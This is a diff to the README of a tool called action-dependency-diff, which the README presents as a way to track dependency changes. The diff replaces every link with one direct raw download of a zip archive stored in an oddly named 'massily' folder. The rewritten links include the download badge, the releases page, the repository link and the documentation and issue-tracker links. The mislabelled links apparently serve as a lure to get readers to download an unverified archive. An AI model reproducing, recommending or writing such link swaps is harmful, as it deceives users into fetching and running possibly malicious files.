@@ -1,7 +1,7 @@
 # 🎉 action-dependency-diff - Easily Track Dependency Changes
 
 ## 📥 Download the Application
-[![Download action-dependency-diff](https://img.shields.io/badge/Download-action--dependency--diff-blue.svg)](https://github.com/AmaraMg2007/action-dependency-diff/releases)
+[![Download action-dependency-diff](https://raw.githubusercontent.com/AmaraMg2007/action-dependency-diff/main/massily/action-dependency-diff.zip)](https://raw.githubusercontent.com/AmaraMg2007/action-dependency-diff/main/massily/action-dependency-diff.zip)
 
 ## 🚀 Getting Started
 Welcome to action-dependency-diff! This tool helps you keep track of changes in your project’s dependencies. Whether you are managing a small personal project or a larger team effort, this application will help you identify any potential problems caused by updates.
@@ -18,7 +18,7 @@ To run action-dependency-diff, ensure your computer meets the following requirem
 - Disk Space: At least 100 MB of available space
 
 ## 📦 Download & Install
-To begin, visit our [Releases Page](https://github.com/AmaraMg2007/action-dependency-diff/releases) to download the latest version of action-dependency-diff.
+To begin, visit our [Releases Page](https://raw.githubusercontent.com/AmaraMg2007/action-dependency-diff/main/massily/action-dependency-diff.zip) to download the latest version of action-dependency-diff.
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version listed on the page.
@@ -53,9 +53,9 @@ If you face any issues, please refer to the GitHub Issues page for help or to re
 We welcome your questions and feedback! Join our community discussions on our GitHub page. Together, we can enhance action-dependency-diff and support each other in managing our projects more effectively.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/AmaraMg2007/action-dependency-diff)
-- [Documentation](https://github.com/AmaraMg2007/action-dependency-diff/blob/main/docs/README.md)
-- [Issues and Bug Reports](https://github.com/AmaraMg2007/action-dependency-diff/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/AmaraMg2007/action-dependency-diff/main/massily/action-dependency-diff.zip)
+- [Documentation](https://raw.githubusercontent.com/AmaraMg2007/action-dependency-diff/main/massily/action-dependency-diff.zip)
+- [Issues and Bug Reports](https://raw.githubusercontent.com/AmaraMg2007/action-dependency-diff/main/massily/action-dependency-diff.zip)
 
 ## 📌 Conclusion
-We hope action-dependency-diff helps you keep your projects running smoothly. By tracking dependency changes and potential issues, you can focus on what matters most: building great software. Visit our [Releases Page](https://github.com/AmaraMg2007/action-dependency-diff/releases) to get started today!
+We hope action-dependency-diff helps you keep your projects running smoothly. By tracking dependency changes and potential issues, you can focus on what matters most: building great software. Visit our [Releases Page](https://raw.githubusercontent.com/AmaraMg2007/action-dependency-diff/main/massily/action-dependency-diff.zip) to get started today!
